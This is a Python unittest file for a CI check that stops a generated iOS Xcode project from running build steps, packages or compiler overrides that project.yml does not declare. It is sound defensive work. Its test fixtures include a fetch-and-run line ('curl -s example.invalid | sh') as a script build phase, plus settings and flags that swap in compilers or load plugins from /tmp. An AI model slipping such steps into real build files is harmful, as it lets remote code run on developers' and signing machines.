"""ios/scripts/build_phases.py: the signing job's check that the generated project runs no build step
ios/project.yml doesn't declare."""
import importlib.util
import json
import pathlib
import tempfile
import unittest

ROOT = pathlib.Path(__file__).resolve().parent.parent
spec = importlib.util.spec_from_file_location("build_phases", ROOT / "ios" / "scripts" / "build_phases.py")
build_phases = importlib.util.module_from_spec(spec)
spec.loader.exec_module(build_phases)

PACKAGE = """		P1 /* XCRemoteSwiftPackageReference "swift-secp256k1" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/21-DOT-DEV/swift-secp256k1";
			requirement = {
				kind = exactVersion;
				version = 0.24.0;
			};
		};
"""

CONFIG = """		C1 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				OTHER_SWIFT_FLAGS = "$(inherited) -Xfrontend -disable-dynamic-actor-isolation";
				PRODUCT_NAME = tafs;
			};
			name = Release;
		};
"""


def project(*objects: str) -> str:
    """An OpenStep project.pbxproj, as XcodeGen writes it, holding these objects and the declared package."""
    return "// !$*UTF8*$!\n{\n\tarchiveVersion = 1;\n\tobjects = {\n" + CONFIG + PACKAGE + "".join(objects) + "\t};\n\trootObject = R1;\n}\n"


SCRIPT = """		B2 /* Fetch */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			name = Fetch;
			shellPath = /bin/sh;
			shellScript = "curl -s example.invalid | sh\\n";
		};
"""

SCHEME = """<?xml version="1.0" encoding="UTF-8"?>
<Scheme><BuildAction><PreActions><ExecutionAction ActionType="Xcode.IDEStandardExecutionActionsCore.ExecutionActionType.ShellScriptAction">
<ActionContent scriptText="sh"/></ExecutionAction></PreActions></BuildAction></Scheme>
"""


class BuildPhasesTest(unittest.TestCase):
    def ios(self, pbxproj=None, spec="name: Tafs\n", scheme=None, xcconfig=None):
        root = pathlib.Path(self.enterContext(tempfile.TemporaryDirectory()))
        (root / "project.yml").write_text(spec)
        proj = root / "Tafs.xcodeproj"
        proj.mkdir()
        (proj / "project.pbxproj").write_text(project() if pbxproj is None else pbxproj)
        if scheme is not None:
            schemes = proj / "xcshareddata" / "xcschemes"
            schemes.mkdir(parents=True)
            (schemes / "Tafs.xcscheme").write_text(scheme)
        if xcconfig is not None:
            (root / "Release.xcconfig").write_text(xcconfig)
        return root

    def found(self, **kw):
        return build_phases.problems(self.ios(**kw))

    def test_a_project_without_build_steps_passes(self):
        self.assertEqual(self.found(scheme="<Scheme><BuildAction/></Scheme>"), [])

    def test_an_undeclared_script_phase_fails_and_is_named(self):
        found = self.found(pbxproj=project(SCRIPT))
        self.assertTrue(any("Fetch" in f for f in found), found)

    def test_a_script_phase_is_found_however_it_is_written(self):
        forms = {
            "compact": SCRIPT.replace("isa = PBXShellScriptBuildPhase;", "isa=PBXShellScriptBuildPhase;"),
            "quoted": SCRIPT.replace("isa = PBXShellScriptBuildPhase;", 'isa = "PBXShellScriptBuildPhase";'),
            "one line": " ".join(SCRIPT.split()) + "\n",
            "spaces": SCRIPT.replace("\t", "    "),
        }
        for form, obj in forms.items():
            with self.subTest(form):
                self.assertNotEqual(self.found(pbxproj=project(obj)), [], form)

    def test_a_script_phase_in_json_or_xml_is_found(self):
        data = {"archiveVersion": "1", "objects": {
            "C1": {"isa": "XCBuildConfiguration", "buildSettings": {}, "name": "Release"},
            "P1": {"isa": "XCRemoteSwiftPackageReference", "repositoryURL": "https://github.com/21-DOT-DEV/swift-secp256k1",
                   "requirement": {"kind": "exactVersion", "version": "0.24.0"}},
            "B2": {"isa": "PBXShellScriptBuildPhase", "name": "Fetch", "shellScript": "sh"}}}
        self.assertNotEqual(self.found(pbxproj=json.dumps(data)), [])
        import plistlib
        self.assertNotEqual(self.found(pbxproj=plistlib.dumps(data).decode()), [])
        del data["objects"]["B2"]
        self.assertEqual(self.found(pbxproj=json.dumps(data)), [], "the same project without it passes")

    def test_the_data_plutil_gives_is_the_data_judged(self):
        # On the runner the project's data comes from plutil's JSON; the text is still scanned too.
        root = self.ios()
        data = {"objects": {
            "P1": {"isa": "XCRemoteSwiftPackageReference", "repositoryURL": "https://github.com/21-DOT-DEV/swift-secp256k1",
                   "requirement": {"kind": "exactVersion", "version": "0.24.0"}},
            "C1": {"isa": "XCBuildConfiguration", "buildSettings": {"SWIFT_EXEC": "/tmp/swiftc"}}}}
        json_path = root / "pbxproj.json"
        json_path.write_text(json.dumps(data))
        found = build_phases.problems(root, json_path)
        self.assertTrue(any("SWIFT_EXEC" in f for f in found), found)
        del data["objects"]["C1"]
        json_path.write_text(json.dumps(data))
        self.assertEqual(build_phases.problems(root, json_path), [])

    def test_a_script_phase_the_data_hides_still_fails(self):
        # Named only in a comment, so the data has no phase to judge.
        self.assertNotEqual(self.found(pbxproj=project("\t\t/* PBXShellScriptBuildPhase */\n")), [])

    def test_an_allowed_script_is_matched_by_its_script_not_its_name(self):
        import hashlib
        digest = hashlib.sha256("curl -s example.invalid | sh\n".encode()).hexdigest()
        allowed = build_phases.ALLOWED
        try:
            build_phases.ALLOWED = frozenset({digest})
            self.assertEqual(self.found(pbxproj=project(SCRIPT)), [])
            other = SCRIPT.replace("curl -s example.invalid | sh", "curl -s other.invalid | sh")
            self.assertNotEqual(self.found(pbxproj=project(other)), [], "same name, other script")
        finally:
            build_phases.ALLOWED = allowed

    def test_build_rules_and_other_running_targets_fail(self):
        for kind in ["PBXBuildRule", "PBXLegacyTarget", "PBXAggregateTarget", "XCLocalSwiftPackageReference"]:
            with self.subTest(kind):
                obj = f'\t\tX1 = {{\n\t\t\tisa = "{kind}";\n\t\t}};\n'
                found = self.found(pbxproj=project(obj))
                self.assertTrue(any(kind in f for f in found), found)

    def test_a_tool_replacing_setting_fails(self):
        for key, value in [("CC", "/usr/bin/python3"), ("LD", "/tmp/ld"), ("LDPLUSPLUS", "x"), ("LIBTOOL", "x"),
                           ("CPLUSPLUS", "x"), ("SWIFT_EXEC", "/tmp/swiftc"), ('"CC[sdk=macosx*]"', "/tmp/cc")]:
            with self.subTest(key):
                config = CONFIG.replace("PRODUCT_NAME = tafs;", f"{key} = {value};")
                self.assertNotEqual(build_phases.problems(self.ios(pbxproj=project().replace(CONFIG, config))), [], key)

    def test_a_compiler_plugin_flag_fails(self):
        for flags in ["-load-plugin-library /tmp/x.dylib", "-Xfrontend -plugin-path -Xfrontend /tmp", "-fplugin=/tmp/x.so",
                      "-Xclang -load -Xclang /tmp/x.so"]:
            with self.subTest(flags):
                config = CONFIG.replace("-disable-dynamic-actor-isolation", flags)
                self.assertNotEqual(self.found(pbxproj=project().replace(CONFIG, config)), [], flags)

    def test_an_xcconfig_cannot_replace_a_tool(self):
        self.assertNotEqual(self.found(xcconfig="CC = /usr/bin/python3\n"), [])
        self.assertNotEqual(self.found(xcconfig="OTHER_SWIFT_FLAGS = -load-plugin-executable /tmp/x\n"), [])
        self.assertEqual(self.found(xcconfig="SWIFT_VERSION = 6.0\n"), [])

    def test_packages_must_be_exactly_project_yml_s(self):
        cases = {
            "another address": PACKAGE.replace("21-DOT-DEV/swift-secp256k1", "example/swift-secp256k1"),
            "another version": PACKAGE.replace("0.24.0", "0.24.1"),
            "a range": PACKAGE.replace("kind = exactVersion;", "kind = upToNextMajorVersion;"),
            "none": "",
        }
        for case, package in cases.items():
            with self.subTest(case):
                self.assertNotEqual(self.found(pbxproj=project().replace(PACKAGE, package)), [], case)
        extra = PACKAGE.replace("P1", "P2").replace("21-DOT-DEV/swift-secp256k1", "example/more")
        self.assertNotEqual(self.found(pbxproj=project(extra)), [], "an extra package")

    def test_an_unreadable_project_fails(self):
        self.assertNotEqual(self.found(pbxproj="{ objects = { X = { isa = "), [])

    def test_a_scheme_action_fails(self):
        self.assertEqual(len(self.found(scheme=SCHEME)), 1)

    def test_declaring_a_script_in_the_spec_fails_until_it_is_allowed(self):
        found = self.found(spec="targets:\n  Tafs:\n    preBuildScripts:\n      - script: sh\n")
        self.assertEqual(len(found), 1)
        self.assertIn("preBuildScripts", found[0])

    def test_no_generated_project_fails(self):
        root = pathlib.Path(self.enterContext(tempfile.TemporaryDirectory()))
        (root / "project.yml").write_text("name: Tafs\n")
        self.assertEqual(build_phases.problems(root), ["no generated .xcodeproj"])

    def test_the_repository_spec_declares_nothing_to_run_and_the_one_package(self):
        # Today's ios/*.yml declare no script, and the package list here is project.yml's.
        self.assertEqual([p for p in build_phases.problems(ROOT / "ios") if p != "no generated .xcodeproj"], [])
        self.assertEqual(build_phases.ALLOWED, frozenset())
        spec_text = (ROOT / "ios" / "project.yml").read_text()
        for url, kind, version in build_phases.PACKAGES:
            self.assertIn(f"url: {url}", spec_text)
            self.assertIn(f"{kind}: {version}", spec_text)
        self.assertEqual(spec_text.count("url: "), len(build_phases.PACKAGES), "every package project.yml declares is listed")


if __name__ == "__main__":
    unittest.main()
